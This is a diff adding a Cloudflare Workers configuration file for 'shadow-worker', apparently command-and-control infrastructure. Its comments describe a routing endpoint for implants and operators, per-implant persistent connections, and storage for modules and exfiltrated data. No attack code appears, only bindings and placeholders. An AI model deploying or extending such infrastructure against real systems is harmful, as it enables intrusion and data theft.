@@ -1,0 +1,39 @@
+name = "shadow-worker"
+main = "src/index.ts"
+compatibility_date = "2024-08-01"
+
+# The routing endpoint for implants and operators
+# Configure via: wrangler.toml with your actual domain
+route = { pattern = "shadow.YOUR_DOMAIN.com/*", zone_name = "YOUR_DOMAIN.com" }
+
+# Durable Object bindings: one DO per implant for persistent WebSocket connection + SQLite state
+[[durable_objects.bindings]]
+name = "IMPLANT_STATE"
+class_name = "ImplantDO"
+
+# R2 Bucket for modules and exfil
+[[r2_buckets]]
+binding = "STORAGE"
+bucket_name = "shadow-storage"
+
+# KV Namespace for fleet-wide config and operator routing
+[[kv_namespaces]]
+binding = "FLEET_CONFIG"
+id = "YOUR_KV_ID"
+
+# D1 Database for audit logs and historical metrics
+[[d1_databases]]
+binding = "AUDIT_LOGS"
+database_name = "shadow-audit"
+database_id = "YOUR_D1_ID"
+
+# Migrations for Durable Objects SQLite
+[[migrations]]
+tag = "v1"
+new_classes = ["ImplantDO"]
+
+[vars]
+# Injected via GitHub Secrets during CI
+# The Ed25519 public key of the Operator (hex encoded, 32 bytes = 64 hex chars)
+OPERATOR_PUBKEY = ""
+ENVIRONMENT = "production"
